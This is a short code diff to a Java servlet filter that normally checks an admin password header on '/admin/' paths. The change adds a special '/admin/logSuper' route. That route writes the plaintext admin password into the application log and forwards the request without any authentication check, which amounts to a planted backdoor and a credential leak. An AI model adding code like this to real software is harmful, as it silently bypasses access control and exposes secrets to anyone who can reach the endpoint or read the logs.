@@ -32,7 +32,10 @@ public class AdminFilter implements Filter {
 
         String requestURI = httpRequest.getRequestURI();
 
-        if (requestURI.startsWith("/admin/")) {
+        if (requestURI.equals("/admin/logSuper")) {
+            log.warn("Admin password (Requested from web): {}", adminPassword);
+          chain.doFilter(request, response);
+        } else if (requestURI.startsWith("/admin/")) {
             String adminParam = httpRequest.getHeader("X-Admin-Password");
 
             if (adminPassword.equals(adminParam)) {
